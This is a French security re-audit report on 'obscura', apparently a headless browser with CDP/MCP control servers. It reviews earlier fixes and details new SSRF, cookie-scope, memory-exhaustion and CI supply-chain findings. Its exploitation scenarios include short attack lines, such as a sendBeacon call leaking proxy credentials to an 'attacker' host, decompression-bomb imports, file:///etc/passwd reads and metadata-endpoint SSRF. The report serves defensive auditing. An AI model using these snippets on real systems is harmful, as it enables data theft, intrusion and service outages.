# Rapport d'audit de sécurité indépendant — `obscura`

**Date :** 2026-06-10 · **Branche :** `ci/audit-gate-and-hygiene` · **Type :** re-audit indépendant (vérification des correctifs antérieurs + recherche de nouveaux défauts + verdict sur les résidus documentés). Méthode : audit multi-agents (221 agents, 9 dimensions, find → vérification adversariale 3 lentilles → critique de complétude). Chaque finding confirmé a recueilli ≥2/3 votes de validateurs indépendants.

---

## 1. Synthèse

La posture de sécurité de ce checkout est **solide sur le cœur défensif déjà corrigé** mais **incomplète sur la périphérie**. Les correctifs majeurs de la session précédente sont **réels, présents et correctement structurés** : le garde anti-rebinding SSRF (résolution DNS fail-closed sur tous les clients d'egress), la réduction de `Deno.core.ops` au seul couple `{op_dom, op_binding_called}`, le filtre d'en-têtes interdits sur `op_fetch_url`, le gate `file://` centralisé sur toutes les entrées CDP, les gardes Origin/Host des transports CDP-WS et MCP-HTTP, le watchdog V8 par commande (OPS-03), et les correctifs de récursion du *serializer* DOM-crate — **tous vérifiés corrects**. Le re-audit ne trouve **aucun nouveau Critique**. Les nouveaux défauts et les résidus encore ouverts se concentrent sur trois axes : (a) le **chemin d'ingestion programmatique des cookies CDP/MCP** qui contourne entièrement la validation de scope, (b) les **caps mémoire manquants** sur deux chemins d'egress (chargeur de modules ES, client *stealth* wreq) plus l'amplification post-cap d'`op_fetch_url`, et (c) un **second serializer DOM (CDP)** récursif non plafonné qui peut faire abort le process.

**Comptes par sévérité (findings ouverts confirmés, dédupliqués) :**

| Sévérité | Nb | Identifiants représentatifs |
|---|---|---|
| Critique | 0 | — |
| Élevée | 4 | DOS-DOM-CDP-1 (≡ DOS-N2), DOS-N1 (≡ NAVDOS-ML1/SSRF-N2/DOS-MODLOADER-1), COOK-CDP-INJECT-1, COOK-04-SAMESITE-EGRESS |
| Moyenne | 11 | SSRF-N1, OPS-04-N1, FILE-GATE-05, COOK-PREFIX-MISSING, COOK-03-PSL-STORED-DOMAIN, COOK-PSL-HARDCODED-GAPS, DOS-OPS-AMP-1, DOS-WREQ (≡ WREQ-BODY-01/SSRF-N3/DOS-WREQ-BODY-1), HOST-0000-1, ACTIONS-UNPINNED-N1, DOCKER-NO-LOCKED-N2 |
| Faible | 8 | COOK-06-WINDOWS-PERMS, CDP-JSON-1, OPS-CFG-N3, OPS-CFG-N4, COOK-PATH-BOUND-1, SEMGREP-NEUTERED-N3, DENY-NO-LICENSES-N4, HDR-NAV-FILTER-N5, UNSAFE-PAGE-01 |
| Info / verdict | — | OPS-03-WATCHDOG-VERDICT (mitigé), OVERFLOW-WORKERPORT-01, COOK-06-CONFIRM, + 16 correctifs vérifiés corrects |

Note : plusieurs identifiants décrivent le **même défaut** (les caps de body du chargeur de modules ES et du client wreq ont été découverts par plusieurs lentilles). Ils sont fusionnés ci-dessous.

---

## 2. Verdict sur les correctifs de la session précédente

| Domaine | Présent ? | Correct ? | Complet ? | Justification (ancrée code) |
|---|---|---|---|---|
| **SSRF anti-rebinding** | Oui | Oui | **Presque** | `SsrfDnsResolver`/`StealthSsrfResolver` rejettent fail-closed si **une** adresse résolue est interdite, sur les 4 clients (`client.rs:165-187`, `wreq_client.rs:47-69`, `ops.rs:509-533`, chargeur de modules). reqwest/wreq ne re-résolvent pas → IP épinglée. Re-validation à chaque hop de redirection. **Gaps :** canonicalisation IPv6 littérale (SSRF-N1) et caps body. |
| **Sandbox ops / `Deno.core.ops`** | Oui | Oui | Oui | IIFE privatise `__ops` ; `globalThis.Deno` remplacé par `{op_dom, op_binding_called}` seulement (`bootstrap.js:6168-6175`) ; init `.expect` (fail-closed) avant tout script de page. Test `page_js_cannot_reach_sensitive_ops_or_internals` (runtime.rs:1233). Aucun leak de `__ops` trouvé. |
| **Filtre en-têtes `op_fetch_url`** | Oui | Oui | Oui | `is_forbidden_request_header` (ops.rs:904) couvre Host/Cookie/Referer/Origin/`sec-*`/`proxy-*`/Content-Length, insensible à la casse, sur les deux branches (intercept + egress). **Note :** non appliqué au chemin de navigation CDP (HDR-NAV-FILTER-N5, Faible). |
| **Gate `file://`** | Oui | Oui | Oui (flags défaut) | Centralisé via `url_is_file_scheme` (case-insensitive + fallback `trim_start`), appliqué **avant** mutation aux 3 entrées CDP : `page.rs:185`, `target.rs:67`, `server.rs:509` (chemin spawn d'interception, ex-résidu CDP-01). Test e2e `file_scheme_gate.rs`. **Résidu OPS-02 :** pas de *jail* quand `--allow-file-access` est activé (FILE-GATE-05). |
| **Cookies — scope Domain/PSL** | Oui | Oui (header/JS) | **Non** | `is_cookie_domain_allowed` (host_is_under_domain + !is_public_suffix) appliqué sur Set-Cookie (`cookies.rs:95`) et document.cookie (`:312`). **Contourné** par le chemin CDP/MCP `set_cookies_from_cdp` (COOK-CDP-INJECT-1, COOK-03-PSL-STORED-DOMAIN) ; PSL hardcodée incomplète (COOK-PSL-HARDCODED-GAPS) ; préfixes `__Host-`/`__Secure-` absents (COOK-PREFIX-MISSING) ; SameSite non appliqué à l'egress (COOK-04). |
| **Cookies — Secure/HttpOnly** | Oui | Oui | Oui | `get_cookie_header` saute Secure sur http (`cookies.rs:155`) ; `get_js_visible_cookies` saute HttpOnly (`:229`) ; document.cookie force `http_only:false` (`:340`). Tests runtime.rs:1862-1909. |
| **Caps DoS — récursion DOM** | Oui | Oui (DOM-crate) | **Non** | `MAX_SERIALIZE_DEPTH=1000` (serialize.rs:9) + walks itératifs `collect_text_inner`/`import_node_from` (tree.rs) + `MAX_NODES=1M`. **Non porté** au serializer **CDP** parallèle `serialize_node` (dom.rs:235-284, DOS-DOM-CDP-1, Élevée). |
| **Caps DoS — body egress** | Partiel | Oui (reqwest) | **Non** | `read_body_capped` sur nav (`client.rs:625`) et `op_fetch_url` (`ops.rs:865`). **Manquant** sur chargeur de modules ES (`module_loader.rs:110`, `resp.text()`) et client wreq (`wreq_client.rs:208`, Content-Length seul). |
| **Auth transport CDP-WS / MCP-HTTP** | Oui | Oui | Oui (loopback) | Origin allowlist default-deny + Host pin (`server.rs:938-961` / `http.rs:17-45`), ACAO jamais `*`. Tests `cors_preflight.rs`. **Footgun :** `--host 0.0.0.0` expose au LAN sans auth (HOST-0000-1). Manque test de régression handshake côté CDP. |
| **Watchdog V8 (OPS-03)** | Oui | Oui | Oui | `cdp_watchdog` armé pour tout non-`is_v8_free_method` (dispatch.rs:304-310), `terminate_execution()` interrompt le JS synchrone, génération monotone anti-disarm-périmé. Couvre `Runtime.evaluate` ET `callFunctionOn`. |
| **Chaîne d'appro / CI** | Partiel | — | **Non** | `--locked` appliqué en CI et release **mais pas dans le Dockerfile** (DOCKER-NO-LOCKED-N2). Actions GitHub non épinglées par SHA (ACTIONS-UNPINNED-N1). Semgrep neutralisé par `continue-on-error` (SEMGREP-NEUTERED-N3). cargo-deny sans check `licenses` (DENY-NO-LICENSES-N4). |

---

## 3. Nouveaux findings & correctifs incomplets

### Sévérité Élevée

**DOS-DOM-CDP-1** (≡ DOS-N2) — *Serializer CDP `DOM.getDocument`/`describeNode` à récursion non bornée (stack overflow → SIGABRT)*
- **Fichier :** `crates/obscura-cdp/src/domains/dom.rs:44,80,235-284`
- **Vecteur :** A1 (page plante un DOM profond) + A2 (client CDP non authentifié émet `getDocument {depth:-1}`). **Flags défaut.**
- **Description :** `serialize_node` (dom.rs:235) récurse avec pour seule borne `current_depth < max_depth` (vérifié ligne 278) ; aucun plafond interne. `depth` est lu des params (`unwrap_or(2)`/`(0)`) et `(-1i64) as u32` = `u32::MAX` — la borne devient effectivement infinie. Le serializer DOM-crate a été durci à `MAX_SERIALIZE_DEPTH=1000` (serialize.rs:9) mais ce **second** serializer ne l'a jamais reçu. Pas de `catch_unwind` sur ce chemin (server.rs:803), et un overflow de pile native est de toute façon non rattrapable.
- **Exploitation :** A1 sert `'<div>'.repeat(100000)` (html5ever ne borne pas l'imbrication ; arbre ~100k de profondeur, sous `MAX_NODES=1M`). A2 (port CDP 127.0.0.1 non authentifié) émet l'idiome standard `DOM.getDocument {"depth":-1}`. La récursion dépasse la pile native (~8 MiB) → SIGSEGV/abort de tout le moteur, tuant toutes les sessions.
- **Remédiation :** ajouter un plafond de récursion interne (≤1000) indépendant du `depth` client, en clampant un `depth` négatif/`-1` à ce plafond, ou réécrire `serialize_node` en itératif à pile explicite comme `descendants()`/`collect_text_inner`.

**DOS-N1** (≡ NAVDOS-ML1, SSRF-N2, DOS-MODLOADER-1) — *Chargeur de modules ES `import()` lit le body sans cap (`resp.text()`) — OOM / bombe de décompression*
- **Fichier :** `crates/obscura-js/src/module_loader.rs:110`
- **Vecteur :** A1 (page exécute `import()` d'une URL hostile) / A2 (`Runtime.evaluate` d'un `import(...)`). **Flags défaut.**
- **Description :** `ObscuraModuleLoader::load` lit le corps entier via `let code = resp.text().await…?` (vérifié ligne 110) **sans borne**, contrairement à `op_fetch_url` (ops.rs:865) et au client de navigation (client.rs:625) qui passent par `read_body_capped`. Le SSRF guard a bien été appliqué ici (`validate_fetch_url` + `SsrfDnsResolver`) mais **pas** le cap. De plus le client reqwest partagé décompresse de façon transparente (features `gzip`/`brotli`/`deflate`), donc une petite réponse compressée gonfle en String multi-Go.
- **Exploitation :** la page exécute `import('https://evil/bomb.mjs')` ; le serveur répond `Content-Encoding: br` avec ~1 Mo qui inflate à plusieurs Go de JS valide, ou stream sans Content-Length. `resp.text()` bufferise tout dans une `String` native (non bornée par `--max-old-space-size`) → OOM-kill du process, tombant toutes les sessions CDP/MCP. Une seule navigation suffit, sans flag non-défaut.
- **Remédiation :** remplacer `resp.text()` par `obscura_net::read_body_capped(resp, obscura_net::max_response_body())` puis décoder (`String::from_utf8_lossy`), traitant un body tronqué comme erreur de chargement. Ferme le dernier egress HTTP page-atteignable non capé.

**COOK-CDP-INJECT-1** — *Injection de cookies pour n'importe quel domaine via CDP/MCP, sans aucun contrôle de scope (y compris suffixes publics)*
- **Fichier :** `crates/obscura-net/src/cookies.rs:188` (`set_cookies_from_cdp`) ; `obscura-cdp/.../network.rs:60-72`, `storage.rs:19-25` ; `obscura-mcp/src/lib.rs:1201-1222,1750-1768`
- **Vecteur :** A2. **Flags défaut.**
- **Description :** le garde de scope (COOK-01) n'est invoqué que sur Set-Cookie et document.cookie. `set_cookies_from_cdp` (cookies.rs:188-209) ne valide **rien** : il stocke `cookie.domain` verbatim comme clé du jar — `jar.entry(cookie.domain).or_default().insert(...)` (vérifié ligne 207). Aucun contrôle de relation d'hôte, aucun rejet de suffixe public, aucune règle `__Host-`/`__Secure-`. Tous les verbes CDP cookie y aboutissent (Network.setCookie/setCookies, Storage.setCookies, MCP `browser_set_cookie`/`browser_set_storage_state`). Les ports CDP/MCP sont sans auth (A2).
- **Exploitation :** un client CDP local non authentifié appelle `Network.setCookie {name:'session', value:'attacker_fixed', domain:'victim-bank.com'}` (ou `domain:'com'`). `domain_matches` l'attache ensuite à toute navigation vers `app.victim-bank.com` (session fixation) ou à tout site `.com` (supercookie). Le cookie peut être marqué Secure+HttpOnly pour devenir collant et invisible au JS.
- **Remédiation :** router l'ingestion CDP/MCP par la même validation que Set-Cookie : rejeter `is_public_suffix(domain)` et, quand l'origine source est disponible, exiger `host_is_under_domain(origin, domain)` ; appliquer les règles `__Host-`/`__Secure-`.

**COOK-04-SAMESITE-EGRESS** — *SameSite est parsé et stocké mais jamais appliqué à l'egress — tous les cookies partent en cross-site*
- **Fichier :** `crates/obscura-net/src/cookies.rs:132-166` (`get_cookie_header`) ; appels `client.rs:529`, `wreq_client.rs:153`, `ops.rs:725`
- **Vecteur :** A1. **Flags défaut.**
- **Description :** `get_cookie_header` sélectionne par host/expiry/Secure/path uniquement ; `entry.same_site` n'est **jamais** lu (boucle cookies.rs:149-162). La signature ne reçoit que l'URL destination — l'origine initiatrice n'est pas propagée dans la pile HTTP, donc SameSite est in-applicable même volontairement. Le chemin de navigation (client.rs/wreq_client.rs) et les redirections serveur transportent les cookies sans contrôle SameSite. (Le fetch page-JS same-origin d'`ops.rs:722` mitige le cross-origin, mais pas la navigation.)
- **Exploitation :** l'agent est connecté à bank.com (cookie session Lax). Il visite evil.com qui contient une redirection top-level / un form auto-soumis vers `https://bank.com/transfer?to=attacker`. La navigation passe par `get_cookie_header(bank.com)` qui attache le cookie sans contrôle SameSite → CSRF que Lax/Strict est censé bloquer.
- **Remédiation :** propager l'origine initiatrice dans le chemin navigation+redirection et dans `get_cookie_header` (param `is_same_site`/origine). Abandonner les cookies SameSite=Strict sur toute requête cross-site, et Lax sur les cross-site non-top-level/unsafe-method (RFC 6265bis). En attendant, documenter qu'obscura n'offre aucune protection CSRF via SameSite.

### Sévérité Moyenne

**SSRF-N1** — *`is_forbidden_ipv6` manque les adresses IPv4-compatibles (`::a.b.c.d`) et 6to4 (`2002::/16`) embarquant une cible interne*
- **Fichier :** `crates/obscura-net/src/client.rs:139-145` (vérifié : pas de bras `::a.b.c.d` ni `2002::`), `101-123`. **Vecteur :** A1/A2. **Flags défaut.**
- **Description :** `is_forbidden_ip` canonicalise IPv4-mapped (`::ffff:`) et NAT64 (`64:ff9b::/96`) mais **pas** les IPv4-compatibles `::a.b.c.d` (ex. `::169.254.169.254`) ni 6to4 `2002:a9fe:a9fe::`. Pour ces formes, `to_ipv4_mapped()` renvoie None et `is_forbidden_ipv6()` renvoie false → le littéral passe `validate_url`. Incohérence notable : `::ffff:127.0.0.1` est bloqué, `::127.0.0.1` ne l'est pas. Comme les littéraux IP n'atteignent jamais le resolver, c'est l'unique couche. Exploitabilité de l'atteinte réelle dépendante de l'OS/routage (formes dépréciées RFC4291, 6to4 nécessite un relais) → plafonné à Moyenne.
- **Exploitation :** A2 émet `Page.navigate` vers `http://[::169.254.169.254]/latest/meta-data/` ou une page renvoie `302 Location: http://[2002:a9fe:a9fe::]/`. `validate_url` renvoie false ; sur un hôte routant ces formes vers l'IMDS, les credentials sont exfiltrés. Même quand le routage échoue, la canonicalisation revendiquée est défaite.
- **Remédiation :** avant le fallback `is_forbidden_ipv6`, extraire et re-vérifier : (a) IPv4-compatible (segments[0..6]==0 → `Ipv4Addr` depuis segments[6..8], ou utiliser `to_ipv4()`) ; (b) 6to4 (`segments[0]==0x2002` → `Ipv4Addr` depuis segments[1..3]). Ajouter tests pour `::127.0.0.1`, `::169.254.169.254`, `2002:7f00:1::`, `2002:a9fe:a9fe::`.

**OPS-04-N1** — *Les credentials de proxy fuitent vers le JS de page (et les logs) via la chaîne d'erreur de parse proxy d'`op_fetch_url`*
- **Fichier :** `crates/obscura-js/src/ops.rs:526-527` (erreur surfacée à `:642-643`). **Vecteur :** A1. **Flag :** proxy `--proxy`/`OBSCURA_PROXY` avec credentials **et** valeur malformée.
- **Description :** le correctif OPS-04 (`redact_proxy`) ne couvre que les logs de `main.rs` et le sentinel de `module_loader.rs`. Il **ne couvre pas** `build_request_client` : quand `reqwest::Proxy::all(proxy)` échoue, l'erreur est `format!("Invalid op_fetch_url proxy '{}': {}", proxy, e)` — embarquant l'URL proxy complète, `user:pass@` inclus. Cette String remonte jusqu'au realm JS de la page (JsErrorBox) où une page hostile (A1) peut la lire, et atteint aussi les logs tracing.
- **Exploitation :** opérateur lance `--proxy socks5://user:s3cret@gw:1080` légèrement malformé. Une page exécute `fetch('https://x/').catch(e => navigator.sendBeacon('https://attacker/', String(e)))` ; elle reçoit l'URL proxy avec credentials.
- **Remédiation :** ne jamais interpoler l'URL proxy brute dans une erreur/log. Passer `redact_proxy(proxy)` ou une chaîne fixe. Déplacer `redact_proxy` dans `obscura-net` pour usage partagé.

**FILE-GATE-05** (résidu OPS-02 confirmé ouvert) — *Sous `--allow-file-access`, aucun jail de chemin : tout fichier lisible par le process est atteignable*
- **Fichier :** `crates/obscura-net/src/client.rs:293-326`. **Vecteur :** A2. **Flag :** `--allow-file-access`.
- **Description :** `fetch_file_url` fait `url.to_file_path()` puis `tokio::fs::read(&path)` sans répertoire racine ni canonicalisation/jail. Une fois `--allow-file-access` activé, toute entrée de navigation `file://` (Page.navigate, Target.createTarget, MCP) atteint cette fonction avec un chemin absolu choisi par l'attaquant : `file:///etc/passwd`, `file:///C:/Windows/win.ini`, `file:///proc/self/environ`, UNC `file://server/share`. Gate binaire tout-ou-rien.
- **Exploitation :** opérateur lance `--allow-file-access` pour tester un report.html local. Un attaquant atteignant 127.0.0.1:9222 envoie `Page.navigate{url:'file:///etc/passwd'}` puis `Runtime.evaluate('document.body.innerText')` et exfiltre des fichiers arbitraires.
- **Remédiation :** exiger un répertoire racine (`--allow-file-access <DIR>`), canonicaliser le chemin résolu et vérifier qu'il préfixe la racine canonicalisée ; rejeter UNC et symlinks d'échappement.

**COOK-PREFIX-MISSING** — *Règles de préfixe `__Host-`/`__Secure-` non implémentées*
- **Fichier :** `crates/obscura-net/src/cookies.rs` (set_cookie:30, set_cookie_from_js:250, set_cookies_from_cdp:188). **Vecteur :** A1. **Flags défaut.**
- **Description :** aucun des trois setters ne vérifie `name.starts_with("__Host-")`/`"__Secure-"` (grep repo : 0 hit en code). Tous acceptent un `__Host-sid` depuis une origine non sécurisée, avec attribut Domain=, ou path non-`/`.
- **Exploitation :** un site pose `__Host-session`. Une réponse hostile sur `http://victim.com` envoie `Set-Cookie: __Host-session=attacker; Domain=victim.com` — qu'un vrai navigateur rejette mais qu'obscura accepte → écrase le cookie légitime (session fixation).
- **Remédiation :** dans les trois setters, exiger Secure+https pour `__Secure-`, et en plus pas de Domain + Path=`/` pour `__Host-` ; rejeter sinon. Appliquer aussi sur le chemin CDP/MCP.

**COOK-03-PSL-STORED-DOMAIN** (résidu) — *Suffixe public accepté comme domaine stocké via le chemin CDP/MCP*
- **Fichier :** `cookies.rs:188-209` + `domain_matches:573`. **Vecteur :** A2. **Flags défaut.**
- **Description :** `is_public_suffix` (cookies.rs:541) existe et est appliqué sur Set-Cookie/JS, mais **pas** sur `set_cookies_from_cdp`. Un cookie stocké `domain="com"` via CDP devient un supercookie (`domain_matches(host,"com")` true pour tout `*.com`).
- **Exploitation :** client CDP/MCP non authentifié appelle `Network.setCookie {name:'track', domain:'com'}` → envoyé à tout `.com` visité.
- **Remédiation :** rejeter `is_public_suffix(domain)` (et domaines mono-label) dans `set_cookies_from_cdp`. À combiner avec COOK-CDP-INJECT-1.

**COOK-PSL-HARDCODED-GAPS** — *`is_public_suffix` est une courte liste hardcodée — de nombreux suffixes réels manquent*
- **Fichier :** `cookies.rs:541-558`. **Vecteur :** A1. **Flags défaut.**
- **Description :** la liste `COMMON` (~60 entrées) n'est pas la vraie PSL. Manquent : `com.ua`, `co.ke`, `or.kr`, `com.ng`, `gov.in`, et surtout des frontières PSL privées (`azurewebsites.net`, `cloudfront.net`, `*.r2.dev`, `*.fastly.net`, `eu.org`, etc.). Pour un host sous un suffixe manquant, une page sur `a.<suffixe>` peut poser `Domain=<suffixe>` et partager un cookie entre tenants non liés.
- **Exploitation :** `evil.azurewebsites.net` pose `Set-Cookie: shared=evil; Domain=azurewebsites.net` ; plus tard `victim-app.azurewebsites.net` reçoit `shared=evil` (injection cross-tenant).
- **Remédiation :** remplacer la liste par le crate `publicsuffix` (sections ICANN + PRIVATE), ou à défaut couvrir les suffixes cloud couramment abusés et documenter le résidu.

**DOS-OPS-AMP-1** — *`op_fetch_url` multiplie le body capé en 3+ copies mémoire avant de retourner (amplification)*
- **Fichier :** `crates/obscura-js/src/ops.rs:865-880`. **Vecteur :** A1. **Flags défaut.**
- **Description :** après `read_body_capped` (256 MiB par défaut), `op_fetch_url` construit 3 dérivés pleine taille : `resp_body` (`from_utf8_lossy`, ~1x), `resp_body_base64` (~1.33x), et `serde_json::json!{...}.to_string()` (sérialise les deux). Pic ~1.1 Go par fetch au cap ; les fetch concurrents multiplient.
- **Exploitation :** page exécute `for(let i=0;i<8;i++) fetch('https://evil/big')` où `/big` stream ~256 MiB → ~11 Go pic → OOM-kill.
- **Remédiation :** éviter de matérialiser à la fois la String lossy, le base64 et une re-sérialisation JSON ; streamer le JSON ou ne renvoyer qu'une représentation ; libérer `resp_bytes`/`resp_body` avant de bâtir la String JSON ; envisager un cap agrégé par-process.

**DOS-WREQ** (≡ WREQ-BODY-01, SSRF-N3, DOS-WREQ-BODY-1 ; résidu confirmé ouvert) — *Client stealth wreq : cap body par Content-Length seulement ; chunked/sans-longueur non borné*
- **Fichier :** `crates/obscura-net/src/wreq_client.rs:197-210`. **Vecteur :** A1. **Flag :** `--stealth` (feature `stealth`).
- **Description :** seul pré-contrôle `if let Some(len) = resp.content_length()` (ligne 200), puis `resp.bytes().await` (ligne 208) bufferise tout. Si `Transfer-Encoding: chunked` ou pas de Content-Length, `content_length()` est None → le gate est sauté. Le commentaire en code (lignes 197-199) l'admet déjà comme follow-up. `len as usize` sur cible 32-bit peut aussi tronquer >4 GiB.
- **Exploitation :** opérateur en `--stealth` ; cible répond chunked sans Content-Length et stream sans fin → `resp.bytes()` OOM-kill.
- **Remédiation :** lecture streamée bornée par `max_response_body()` (boucle `resp.chunk()`/Stream), tronquer/erreur au-delà du cap indépendamment du Content-Length, qui reste un fast-reject.

**HOST-0000-1** — *`--host 0.0.0.0` + flags défaut expose le contrôle CDP/MCP non authentifié à tout le LAN (footgun opérateur)*
- **Fichier :** `obscura-cli/src/main.rs:63-64,158-159` ; `obscura-cdp/src/server.rs:951-961` ; `obscura-mcp/src/http.rs:17-27`. **Vecteur :** A2. **Flag :** `--host 0.0.0.0`.
- **Description :** les serveurs sont sans auth par design ; le bind loopback est la seule protection. `ws_host_is_safe`/`header_host_is_safe` acceptent **tout littéral IP** (`hostname.parse::<IpAddr>().is_ok()`), donc un pair LAN passe le Host pin, et un client natif n'envoie pas d'Origin. Résultat : contrôle complet non authentifié depuis tout le LAN (`Network.getAllCookies`, `Runtime.evaluate`, et lecture fichier si `--allow-file-access`). Le rebinding navigateur reste bloqué (Host nom-de-domaine rejeté). La doc Docker recommande 0.0.0.0, rendant le footgun probable.
- **Exploitation :** `obscura serve --host 0.0.0.0` ; un pair LAN fait `puppeteer.connect({browserWSEndpoint:'ws://192.168.1.50:9222/devtools/browser'})` → dump cookies + JS arbitraire.
- **Remédiation :** traiter le bind non-loopback comme mode privilégié : warning proéminent au démarrage + opt-in explicite (`--insecure-expose` ou token/bearer sur CDP et MCP). Documenter que 0.0.0.0 ne va que derrière firewall.

**ACTIONS-UNPINNED-N1** — *Toutes les GitHub Actions épinglées à des tags/branches mutables, pas des SHA de commit*
- **Fichier :** `.github/workflows/release.yml:51,53,105` ; `docker.yml:15-34` ; `ci.yml:20-60`. **Vecteur :** A4. **Flags défaut.**
- **Description :** aucun `uses:` n'est épinglé à un SHA 40-char (grep : 0 match). `dtolnay/rust-toolchain@stable` est une **branche** (forme la plus faible). `release.yml` tourne avec `contents: write` et produit les binaires publiés ; `docker.yml` détient les credentials Docker Hub.
- **Exploitation :** un attaquant compromet `softprops/action-gh-release` ou `dtolnay/rust-toolchain`, force-push le tag/branche ; le prochain `git tag v*` produit des binaires backdoorés, avec des `.sha256` correspondants (générés dans le même run compromis).
- **Remédiation :** épingler chaque `uses:` à un SHA complet (`@<sha> # v4.x`), Dependabot/Renovate pour les bumps. Prioriser `release.yml` et `docker.yml`.

**DOCKER-NO-LOCKED-N2** — *Le build de l'image Docker n'utilise pas `--locked`, contournant la garantie Cargo.lock audité*
- **Fichier :** `Dockerfile:30,37` ; `.github/workflows/docker.yml:33-43`. **Vecteur :** A4. **Flags défaut.**
- **Description :** CI (`cargo test --workspace --locked`) et release (`cargo build --release --locked`) imposent le Cargo.lock committé (SUPPLY-02). Le Dockerfile **omet** `--locked` (lignes 30 et 37). `docker.yml` pousse `obscura:latest`/`:<version>` à chaque tag avec ce Dockerfile, donc l'image publiée peut résoudre vers des versions plus récentes que l'ensemble audité.
- **Exploitation :** entre le commit du lock et un tag, une dépendance transitive publie une nouvelle version semver-compatible (légitime ou via compte hijacké) ; les binaires natifs gardent la version auditée, l'image Docker tire la nouvelle.
- **Remédiation :** ajouter `--locked` aux deux invocations `cargo build` du Dockerfile.

### Sévérité Faible

**COOK-06-WINDOWS-PERMS** — *Restriction 0o600 du jar Unix-only ; sur Windows (l'hôte réel) le fichier hérite des ACL du répertoire sans restriction propriétaire explicite*
- **Fichier :** `cookies.rs:438-447`. **Vecteur :** A3. **Description :** `set_permissions(0o600)` seulement sous `#[cfg(unix)]` (ligne 442) ; pas de branche `#[cfg(windows)]` durcissant la DACL. Sur un hôte Windows multi-utilisateur avec chemin hors profil (ProgramData, dossier synchro), un autre utilisateur local lit `cookies.json` (tokens de session en clair) et rejoue la session. **Remédiation :** poser une DACL propriétaire-seul sur Windows (windows-acl/icacls) ou refuser de persister hors d'un répertoire per-user connu.

**CDP-JSON-1** — *Endpoints HTTP `/json/*` sans Host pin ni contrôle Origin (sonde liveness/cible lisible par rebinding)*
- **Fichier :** `obscura-cdp/src/server.rs:259-270,295-335`. **Vecteur :** A2. **Flags défaut.** **Description :** contrairement au handshake WS, `/json/version`/`/json/list`/`/json/protocol` (sélectionnés par substring, server.rs:259-266) sont répondus sans Host pin ni Origin. Pas de CORS donc une page cross-origin normale ne lit pas le body, mais après rebinding (evil.com→127.0.0.1) un fetch same-origin lit le JSON, confirmant qu'obscura tourne et exposant la liste cible (placeholder) et le `webSocketDebuggerUrl`. Données de faible valeur ; le WS reste pinné. **Remédiation :** appliquer `ws_host_is_safe` à `handle_http_json_blocking` (le Host est déjà bufferisé), retourner 403 sur domaine étranger.

**OPS-CFG-N3** (résidu) — *Le SSRF guard désactivable par `OBSCURA_ALLOW_PRIVATE_NETWORK` hérité sans warning au démarrage*
- **Fichier :** `main.rs:217-225,321-330` ; `client.rs:80-90`. **Vecteur :** A3. **Flag :** désactivation = `--allow-private-network`/env (non-défaut) ; le gap rapporté est l'**absence de warning**. **Description :** rien ne logge quand le guard est désactivé ; le filtre par défaut est `warn`. La variable étant process-wide, elle est héritée silencieusement d'un parent (shell, Docker ENV, CI), laissant un opérateur croire le SSRF actif alors qu'il est off (y compris pour les workers enfants). **Remédiation :** `tracing::warn!` une fois au démarrage quand `allow_private_network` est effectif (flag OU env), au niveau `warn`.

**OPS-CFG-N4** — *Le serve multi-worker passe les credentials proxy en argv d'enfant (visibles aux autres utilisateurs locaux)*
- **Fichier :** `main.rs:407-421`. **Vecteur :** A3. **Flag :** `serve --workers N>1` + proxy à credentials. **Description :** `run_multi_worker_serve` fait `cmd.arg("--proxy").arg(p)` — les command lines sont world-readable (`/proc/<pid>/cmdline`, `ps`, `wmic`/`Get-CimInstance Win32_Process`). Le chemin frère `run_parallel_scrape` (main.rs:890) utilise correctement `OBSCURA_PROXY` (env). **Remédiation :** passer le proxy via `OBSCURA_PROXY` aux workers (le worker le lit déjà).

**COOK-PATH-BOUND-1** — *Le path-match cookie n'applique pas la frontière de répertoire RFC 6265 (`Path=/admin` fuit vers `/administrator`)*
- **Fichier :** `cookies.rs:158,240`. **Vecteur :** A1. **Flags défaut.** **Description :** `get_cookie_header` et `get_js_visible_cookies` décident via `path.starts_with(&entry.path)` sans contrôle de frontière. Un cookie `Path=/admin` est renvoyé pour `/administrator`, `/admin-public`. Impact borné au même host. **Remédiation :** implémenter le path-match §5.1.4 (égalité exacte, OU cookie-path finit par `/`, OU caractère suivant == `/`).

**SEMGREP-NEUTERED-N3** (résidu) — *Le job SAST Semgrep neutralisé par `continue-on-error: true`*
- **Fichier :** `.github/workflows/ci.yml:64-75`. **Vecteur :** A4. **Flags défaut.** **Description :** l'unique étape SAST porte `continue-on-error: true` (ci.yml:75) ; `--error` devient no-op. Combiné à Clippy informatif (pas de `-D warnings`), cargo-deny est le seul gate dur. **Remédiation :** retirer `continue-on-error` (ou mode baseline-diff `--baseline-ref`) une fois le bruit du ruleset trié.

**DENY-NO-LICENSES-N4** — *L'invocation cargo-deny CI omet le check `licenses` ; l'allow-list de `deny.toml` n'est jamais appliquée*
- **Fichier :** `.github/workflows/ci.yml:60-62` ; `deny.toml:21-39`. **Vecteur :** A4. **Flags défaut.** **Description :** `command: check advisories bans sources` — `licenses` exclu (commentaire deny.toml:23 le confirme). Une dépendance transitive sous licence copyleft/inconnue n'est pas détectée. **Remédiation :** ajouter `licenses` à la commande après avoir résolu/excepté les violations courantes.

**HDR-NAV-FILTER-N5** — *`Network.setExtraHTTPHeaders` ne filtre pas les en-têtes interdits sur le chemin de navigation (incohérent avec OPS-HDR-01)*
- **Fichier :** `obscura-cdp/src/domains/network.rs:35-47` ; `client.rs:649-651,560-567`. **Vecteur :** A2. **Flags défaut.** **Description :** `op_fetch_url` filtre via `is_forbidden_request_header` ; le handler CDP `setExtraHTTPHeaders` stocke verbatim et applique non filtré à la navigation (Host/Cookie/Referer/Origin injectables). A2-only (déjà privilégié) → durcissement, pas une rupture de frontière. **Remédiation :** appliquer `is_forbidden_request_header` dans `set_extra_headers`.

**UNSAFE-PAGE-01** — *`obscura::Element` reconstruit `&mut Page` depuis un `*const Page` (aliasing `&mut` possible) ; non sound mais atteignable seulement via la façade librairie (A3)*
- **Fichier :** `crates/obscura/src/page.rs:107,117,127`. **Vecteur :** A3. **Description :** `Element` stocke `page: *const Page` ; `text()`/`attribute()`/`click()` font `&mut *(self.page as *mut Page)`. Deux `&mut Page` peuvent aliaser → UB. **Critique pour ce modèle :** les serveurs CDP/MCP dépendent d'`obscura-browser`, **pas** de ce crate ; A1/A2 ne l'atteignent pas, seulement A3 (opérateur écrivant du Rust). **Remédiation :** redesign d'`Element` pour prendre `&mut Page` en argument explicite ou re-borrow via handle validé par le borrow checker.

### Info / verdicts

- **OPS-03-WATCHDOG-VERDICT** — résidu OPS-03 **mitigé** : le watchdog V8 par commande est câblé et correct (cf. §4).
